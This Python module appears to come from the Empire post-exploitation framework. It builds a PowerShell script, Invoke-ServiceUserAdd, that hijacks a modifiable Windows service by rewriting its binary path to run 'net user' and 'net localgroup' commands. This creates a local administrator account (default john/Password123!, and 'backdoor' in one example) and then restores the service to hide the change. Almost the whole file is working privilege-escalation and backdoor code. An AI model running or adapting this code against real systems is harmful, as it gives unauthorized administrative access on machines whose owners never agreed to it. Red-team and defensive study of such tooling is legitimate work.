from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ServiceUserAdd',

            'Author': ['@harmj0y'],

            'Description': ("Modifies a target service to create a local user and add it "
                            "to the local administrators."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ServiceName' : {
                'Description'   :   "The service name to manipulate.",
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   "The username to add.",
                'Required'      :   False,
                'Value'         :   'john'
            },
            'Password' : {
                'Description'   :   "Password to set for the added user.",
                'Required'      :   False,
                'Value'         :   'Password123!'
            },
            'GroupName' : {
                'Description'   :   "Local group to add the user to.",
                'Required'      :   False,
                'Value'         :   'Administrators'
            }           
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        script = """
function Invoke-ServiceUserAdd {
    <#
    .SYNOPSIS
    Modifies a target service to create a local user and add it
    to the local administrators.
    
    .DESCRIPTION
    This function stops a service, modifies it to create a user, starts
    the service, stops it, modifies it to add the user to the specified group,
    stops it, and then restores the original EXE path.
    
    .PARAMETER ServiceName
    The service name to manipulate. Required.

    .PARAMETER UserName
    The username to add. If not given, it defaults to "john"

    .PARAMETER Password
    The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER GroupName
    Group to add the user to (default of Administrators)
        
    .OUTPUTS
    System.bool. The user/password created if successful, false otherwise.

    .EXAMPLE
    > Invoke-ServiceUserAdd -ServiceName VulnSVC
    Abuses service 'VulnSVC' to add a localuser "john" with password 
    "Password123! to the  machine and local administrator group

    .EXAMPLE
    > Invoke-ServiceUserAdd -ServiceName VulnSVC -UserName backdoor -Password password -GroupName "Power Users"
    Abuses service 'VulnSVC' to add a localuser "backdoor" with password 
    "password" to the  machine and local "Power Users" group
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName,
        [string]$UserName = "john",
        [string]$Password = "Password123!",
        [string]$GroupName = "Administrators"
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'" | ?{$_}

    # make sure we got a result back
    if ($TargetService){
        try{

            # try to enable the service it was it was disabled
            $RestoreDisabled = $false
            if ($TargetService.StartMode -eq "Disabled"){
                Write-Verbose "Service '$ServiceName' disabled, enabling..."

                $result = sc.exe config $($TargetService.Name) start= demand
                if ($result -contains "Access is denied."){
                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
                    return $false
                }
                $RestoreDisabled = $true
            }

            # extract the original path and state so we can restore it later
            $OriginalPath = $TargetService.PathName
            $OriginalState = $TargetService.State
            Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
            Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"

            Write-Verbose "Adding user '$UserName'"
            # stop the service
            $result = sc.exe stop $($TargetService.Name)
            if ($result -contains "Access is denied."){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $false
            }

            # modify the service path to add a user
            $UserAddCommand = "net user $UserName $Password /add"
            # change the path name to the user add command- if sc config doesn't error out here,
            # it shouldn't later on
            $result = sc.exe config $($TargetService.Name) binPath= $UserAddCommand
            if ($result -contains "Access is denied."){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $false
            }

            # start the service and breath
            $result = sc.exe start $($TargetService.Name)
            Start-Sleep -s 1

            Write-Verbose "Adding user '$UserName' to group '$GroupName'"
            # stop the service
            $result = sc.exe stop $($TargetService.Name)
            Start-Sleep -s 1

            # modify the service path to add the user to the specified local group
            $GroupAddCommand = "net localgroup $GroupName $UserName /add"
            # change the path name to the group add command
            $result = sc.exe config $($TargetService.Name) binPath= $GroupAddCommand

            # start the service and breath
            $result = sc.exe start $($TargetService.Name)
            Start-Sleep -s 1

            Write-Verbose "Restoring original path to service '$ServiceName'"
            # stop the service
            $result = sc.exe stop $($TargetService.Name)
            Start-Sleep -s 1
            # restore the original binary path
            $result = sc.exe config $($TargetService.Name) binPath= $OriginalPath

            # try to restore the service to whatever state it was
            if ($RestoreDisabled){
                Write-Verbose "Re-disabling service '$ServiceName'"
                $result = sc.exe config $($TargetService.Name) start= disbaled
            }
            elseif ($OriginalState -eq "Paused"){
                Write-Verbose "Starting and then pausing service '$ServiceName'"
                $result = sc.exe start $($TargetService.Name)
                Start-Sleep -s .5
                $result = sc.exe pause $($TargetService.Name)
            }
            elseif ($OriginalState -eq "Stopped"){
                Write-Verbose "Leaving service '$ServiceName' in stopped state"
            }
            else{
                Write-Verbose "Starting service '$ServiceName'"
                $result = sc.exe start $($TargetService.Name)
            }

            "[+] User '$UserName' created with password '$Password' and added to localgroup '$GroupName'"
        }
        catch{
            Write-Warning "Error while modifying service '$ServiceName': $_"
            $false
        }
    }

    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
} Invoke-ServiceUserAdd"""

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value']) 

        return script
